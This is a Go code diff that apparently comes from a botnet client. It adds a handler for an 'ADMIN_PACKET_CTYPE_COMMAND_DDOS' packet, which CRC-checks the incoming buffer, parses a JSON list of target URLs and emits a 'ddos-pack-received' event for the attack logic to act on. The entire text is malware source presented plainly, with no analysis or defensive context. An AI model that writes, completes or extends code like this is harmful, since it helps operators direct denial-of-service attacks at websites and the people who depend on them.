@@ -2,6 +2,7 @@ package modules
 
 import (
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"icu/common/constants"
 	"icu/common/types"
@@ -119,6 +120,21 @@ func (this *ClientModule) ParseData(socketBuf []byte) {
 		break
 
 	case constants.ADMIN_PACKET_CTYPE_COMMAND_DDOS:
+		if !utils.CheckCRC(this.receiveBuf) {
+			this.logger.Warning("CRC detected an error when parsing the packet, not all data was received")
+			return
+		}
+
+		urlsBytes := this.receiveBuf[12:]
+
+		var urls []string
+		if err := json.Unmarshal(urlsBytes, &urls); err != nil {
+			this.logger.Error(fmt.Sprintf("Failed parse (%s) to []string", hex.EncodeToString(urlsBytes)))
+			return
+		}
+
+		this.emitter.Emit("ddos-pack-received", urls)
+		break
 
 	default:
 		this.emitter.Emit("error", fmt.Sprintf("Failed to get/parse type_is (%d)", packetType))
